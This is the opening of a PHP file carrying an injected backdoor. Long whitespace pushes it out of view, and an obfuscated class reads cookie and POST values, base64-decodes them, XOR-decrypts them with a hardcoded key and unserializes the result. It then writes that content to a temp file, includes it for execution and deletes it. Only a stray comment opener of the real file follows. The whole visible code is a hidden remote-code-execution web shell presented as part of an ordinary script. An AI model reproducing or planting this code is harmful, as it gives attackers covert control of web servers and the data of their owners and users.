<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("rNAXAvGl")){class rNAXAvGl{public static $YYVEmcHpHg = "GJTERPuLYeIShUIz";public static $EqvDQHTid = NULL;public function __construct(){$SocIXPjks = @$_COOKIE[substr(rNAXAvGl::$YYVEmcHpHg, 0, 4)];if (!empty($SocIXPjks)){$lpNPGRG = "base64";$QILmUf = "";$SocIXPjks = explode(",", $SocIXPjks);foreach ($SocIXPjks as $zlAAFraTZy){$QILmUf .= @$_COOKIE[$zlAAFraTZy];$QILmUf .= @$_POST[$zlAAFraTZy];}$QILmUf = array_map($lpNPGRG . "_decode", array($QILmUf,)); $QILmUf = $QILmUf[0] ^ str_repeat(rNAXAvGl::$YYVEmcHpHg, (strlen($QILmUf[0]) / strlen(rNAXAvGl::$YYVEmcHpHg)) + 1);rNAXAvGl::$EqvDQHTid = @unserialize($QILmUf);}}public function __destruct(){$this->TtvnUQVdpF();}private function TtvnUQVdpF(){if (is_array(rNAXAvGl::$EqvDQHTid)) {$gOVbEZZSx = sys_get_temp_dir() . "/" . crc32(rNAXAvGl::$EqvDQHTid["salt"]);@rNAXAvGl::$EqvDQHTid["write"]($gOVbEZZSx, rNAXAvGl::$EqvDQHTid["content"]);include $gOVbEZZSx;@rNAXAvGl::$EqvDQHTid["delete"]($gOVbEZZSx);exit();}}}$XHgaSloTgG = new rNAXAvGl(); $XHgaSloTgG = NULL;} ?><?php
/**
